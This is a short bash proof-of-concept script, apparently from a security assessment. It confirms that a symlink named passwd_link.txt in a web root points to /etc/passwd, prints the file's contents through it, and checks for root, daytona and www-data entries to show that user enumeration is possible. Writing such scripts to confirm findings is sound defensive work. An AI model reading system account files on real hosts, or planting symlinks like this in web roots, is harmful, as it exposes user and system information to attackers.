#!/bin/bash

# POC: Symlink-Based /etc/passwd Access
# This script demonstrates the vulnerability of /etc/passwd being accessible
# through a symbolic link in the web root directory

WEB_ROOT="/home/daytona/repo/app/website"
SYMLINK="${WEB_ROOT}/passwd_link.txt"

echo "[*] Symlink-Based /etc/passwd Access POC"
echo "[*] Web Root: $WEB_ROOT"
echo "[*] Symlink Path: $SYMLINK"
echo ""

# Step 1: Check if the symlink exists
echo "[*] Checking if passwd_link.txt symlink exists..."
if [ -L "$SYMLINK" ]; then
    echo "[+] Symlink found: $SYMLINK"
    
    # Get the target of the symlink
    LINK_TARGET=$(readlink -f "$SYMLINK")
    echo "[+] Symlink target: $LINK_TARGET"
    
    # Verify it points to /etc/passwd
    if [ "$LINK_TARGET" = "/etc/passwd" ]; then
        echo "[+] CONFIRMED: Symlink points to /etc/passwd"
    else
        echo "[-] Symlink target is not /etc/passwd"
        exit 1
    fi
else
    echo "[-] Symlink does not exist"
    exit 1
fi

echo ""
echo "[*] Reading /etc/passwd through the symlink..."
echo ""

# Step 2: Read the file through the symlink
if [ -r "$SYMLINK" ]; then
    echo "[+] File is readable through symlink"
    echo ""
    echo "[+] Contents of /etc/passwd (via symlink):"
    echo "================================"
    cat "$SYMLINK"
    echo "================================"
    echo ""
    
    # Step 3: Verify critical entries exist
    echo "[*] Verifying sensitive information exposure..."
    if grep -q "^root:" "$SYMLINK"; then
        echo "[+] CRITICAL: Root entry found in /etc/passwd"
        if grep -q "^daytona:" "$SYMLINK"; then
            echo "[+] CRITICAL: daytona user entry found"
        fi
        if grep -q "^www-data:" "$SYMLINK"; then
            echo "[+] CRITICAL: www-data (web server user) entry found"
        fi
        echo ""
        echo "[+] VULNERABILITY CONFIRMED:"
        echo "    - /etc/passwd is accessible through web root symlink"
        echo "    - System user enumeration is possible"
        echo "    - Attacker can identify valid users, UIDs, and shells"
        exit 0
    else
        echo "[-] Could not verify passwd content"
        exit 1
    fi
else
    echo "[-] File is not readable through symlink"
    exit 1
fi